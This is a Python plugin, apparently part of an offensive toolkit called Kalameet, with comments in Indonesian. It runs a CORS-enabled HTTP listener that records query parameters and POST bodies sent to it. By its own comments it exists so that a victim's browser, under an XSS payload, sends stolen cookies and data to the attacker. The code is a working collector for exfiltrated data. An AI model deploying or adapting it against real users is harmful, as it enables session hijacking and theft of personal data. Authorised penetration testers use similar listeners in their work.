import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from kalameet.core.base import BasePlugin
from kalameet.core.interface import Colors
from kalameet.core.logger import Logger

# Variabel global untuk akses logger
webhook_logger = None

class WebhookHandler(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        # [PENTING] CORS Header agar browser korban mau kirim data ke kita
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.end_headers()

    def do_OPTIONS(self):
        self._set_headers()

    def log_request_data(self, method, data_dict):
        print(f"\n{Colors.GREEN}[+] {method} REQUEST CAPTURED!{Colors.ENDC}")
        print(f"    Source: {self.client_address[0]}")
        print(f"    User-Agent: {self.headers.get('User-Agent')}")
        
        if data_dict:
            print(f"{Colors.WARNING}[*] DATA:{Colors.ENDC}")
            for k, v in data_dict.items():
                # Bersihkan list jika cuma 1 item
                val = v[0] if isinstance(v, list) and len(v) == 1 else v
                print(f"    {k}: {Colors.BOLD}{val}{Colors.ENDC}")
                
            # Simpan ke Log
            if webhook_logger:
                webhook_logger.log("Webhook", "CAPTURED", f"{method} Data", data_dict)
        else:
            print("    [No Data Payload]")

    def do_GET(self):
        self._set_headers()
        # Parse URL Query (misal: /?cookie=abcdef)
        parsed_path = urlparse(self.path)
        query_params = parse_qs(parsed_path.query)
        
        self.log_request_data("GET", query_params)
        self.wfile.write(b"Data Received by Kalameet Webhook")

    def do_POST(self):
        self._set_headers()
        # Baca Body
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length).decode('utf-8')
        
        # Coba parsing sebagai Form Data
        post_data = parse_qs(post_body)
        # Kalau kosong (mungkin JSON raw), simpan raw body-nya
        if not post_data and post_body:
            post_data = {'RAW_BODY': post_body}
            
        self.log_request_data("POST", post_data)
        self.wfile.write(b"Data Received by Kalameet Webhook")

class WebhookPlugin(BasePlugin):
    meta = {
        'name': 'webhook',
        'description': 'Local Webhook Listener (CORS Enabled)',
        'author': 'Kalameet'
    }

    def __init__(self):
        super().__init__()
        global webhook_logger
        self.logger = Logger(session_name="local_webhook")
        webhook_logger = self.logger

    def add_arguments(self, parser):
        parser.add_argument("--port", type=int, default=8000, help="Listening Port (Default: 8000)")

    def run(self, args):
        print(f"{Colors.BLUE}[*] Starting Local Webhook on Port {args.port}...{Colors.ENDC}")
        print(f"{Colors.BLUE}[*] CORS Headers Enabled (Safe for XSS Fetch){Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Ready to catch incoming data. Press Ctrl+C to stop.{Colors.ENDC}")
        
        server_address = ('0.0.0.0', args.port)
        httpd = HTTPServer(server_address, WebhookHandler)
        
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Colors.FAIL}[!] Webhook stopped.{Colors.ENDC}")